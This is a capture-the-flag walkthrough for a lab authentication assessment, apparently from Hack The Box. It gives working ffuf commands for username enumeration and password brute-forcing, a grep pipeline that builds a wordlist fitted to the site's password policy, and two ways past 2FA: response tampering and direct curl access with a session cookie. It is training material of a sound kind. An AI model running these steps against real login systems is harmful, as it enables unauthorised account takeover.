
---
## Scenario

The tech company `SecureMint Innovations` has tasked you to perform a security assessment of their web application after deploying an entirely new authentication concept, including an updated password policy designed to strengthen overall account security. The client wants assurance that no hidden weaknesses could still put user accounts at risk. Your task is to focus specifically on identifying vulnerabilities within the authentication process. Try to utilize the various techniques you learned in this module to identify and exploit vulnerabilities found in the web application.

**Walkthrough:** https://resetenv.com/posts/htb/
### Combine the attacks you have learned in this module to obtain the flag.

**Answer:** Used ffuf to enumerate usernames from the xato-net-10-million-usernames wordlist, filtering by response containing string:

```bash
ffuf -w xato-usernames.txt -u http://TARGET/login.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=Testpass12345" -fr "Invalid Credentials."
```

Found to be `gladys`

then created password according to the criteria on register page:

```bash
grep '[[:upper:]]' /usr/share/seclists/Passwords/Leaked-Databases/rockyou/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' \
  | grep -E '^.{12}$' | grep -E '^[a-zA-Z0-9]+$' > custom_exact12.txt
```

Then brute-forced with ffuf:

```bash
ffuf -w custom_exact12.txt -u http://TARGET/login.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=gladys&password=FUZZ" -fr "Invalid credentials"
```

Found password: `dWinaldasD13`

Intercepting the login response and changing the status code from `302` to `200` and location from `/2fa.php` to `/profile.php` bypassed the 2fa page entirely.

Otherway, from walkthrough **3. 2FA Bypass via Direct Access (Authentication Bypass)**

After logging in, gladys gets redirected to `2fa.php` for OTP verification. However, accessing `profile.php` directly returns a 302 redirect to `2fa.php` but the response body still contains the full page content including the flag. The server renders the protected page before enforcing the redirect — a classic authentication bypass.

Login to get session:

```bash
SESSION=$(curl -s -i -X POST http://TARGET/login.php \
  -d "username=gladys&password=dWinaldasD13" | \
  grep "Set-Cookie: PHPSESSID" | head -1 | cut -d'=' -f2 | cut -d';' -f1)
```

Access profile.php directly:

```bash
curl -s -b "PHPSESSID=$SESSION" http://TARGET/profile.php
```

The response body contained the flag.